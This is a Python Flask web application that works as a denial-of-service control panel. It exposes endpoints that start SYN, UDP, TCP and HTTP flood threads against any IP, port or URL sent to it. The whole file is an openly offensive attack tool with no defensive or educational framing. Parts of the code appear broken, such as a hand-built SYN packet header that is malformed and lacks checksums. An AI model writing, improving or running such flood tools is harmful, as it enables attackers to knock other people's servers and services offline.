#Made By Ratichubi <3


from flask import Flask, request, jsonify, render_template
import socket
import threading
import time
import requests

app = Flask(__name__)

def syn_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    ip_header = b'\x45\x00\x00\x28'
    ip_header += socket.inet_aton(target_ip)
    ip_header += socket.inet_aton(target_ip)
    ip_header += b'\x00\x06\x00\x00'
    ip_header += b'\x40\x06\x00\x00'
    ip_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    tcp_header = b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x50\x02\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'

    packet = ip_header + tcp_header

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b'\x00\x01\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(message, (target_ip, target_port))

def tcp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(b'A' * 1024)

def http_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
        except requests.exceptions.RequestException:
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/syn_flood', methods=['POST'])
def syn_flood_endpoint():
    data = request.json
    target_ip = data['target_ip']
    target_port = data['target_port']
    duration = data['duration']

    threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)).start()
    return jsonify({"status": "SYN flood started"})

@app.route('/udp_flood', methods=['POST'])
def udp_flood_endpoint():
    data = request.json
    target_ip = data['target_ip']
    target_port = data['target_port']
    duration = data['duration']

    threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)).start()
    return jsonify({"status": "UDP flood started"})

@app.route('/tcp_flood', methods=['POST'])
def tcp_flood_endpoint():
    data = request.json
    target_ip = data['target_ip']
    target_port = data['target_port']
    duration = data['duration']

    threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration)).start()
    return jsonify({"status": "TCP flood started"})

@app.route('/http_flood', methods=['POST'])
def http_flood_endpoint():
    data = request.json
    target_url = data['target_url']
    duration = data['duration']

    threading.Thread(target=http_flood, args=(target_url, duration)).start()
    return jsonify({"status": "HTTP flood started"})

if __name__ == '__main__':
    app.run(debug=True)
